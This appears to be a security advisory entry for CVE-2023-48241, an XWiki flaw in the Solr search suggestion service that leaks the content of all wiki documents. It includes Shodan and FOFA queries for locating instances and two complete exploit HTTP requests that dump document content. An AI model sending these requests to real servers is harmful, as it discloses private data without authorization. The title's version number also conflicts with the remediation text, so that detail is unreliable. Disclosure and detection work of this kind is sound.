---
layout: post
cve_id: CVE-2023-48241
title: XWiki < 4.10.15 - Information Disclosure
pcap: true
pcap_path: /pcaps/2023/CVE-2023-48241.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-48241.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Successful exploitation could lead to disclosure of content of all documents
  of all wikis.

  '
remediation: 'This has been fixed in XWiki 15.6RC1, 15.5.1 and 14.10.15 by not listing
  documents whose rights cannot be checked.

  '
reference:
- https://jira.xwiki.org/browse/XWIKI-21138
- https://nvd.nist.gov/vuln/detail/CVE-2023-48241
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2023-48241
  cwe-id: CWE-285
  epss-score: 0.69186
  epss-percentile: 0.98582
  cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  verified: true
  vendor: xwiki
  product: xwiki
  shodan-query: html:"data-xwiki-reference"
  fofa-query: body="data-xwiki-reference"
tags:
- cve
- cve2024
- xwiki
- exposure
- vuln
---

## üîç Vulnerability Description
The Solr-based search suggestion provider that also duplicates as generic JavaScript API for search results in XWiki exposes the content of all documents of all wikis to anybody who has access to it, by default it is public. This exposes all information stored in the wiki (but not some protected information like password hashes). While there is a right check normally, the right check can be circumvented by explicitly requesting fields from Solr that don't include the data for the right check. This can be reproduced by opening <xwiki-server>/xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+ where <xwiki-server> is the URL of the XWiki installation. If this displays any results, the wiki is vulnerable.


## üåê HTTP Request
```nohighlight
GET /bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

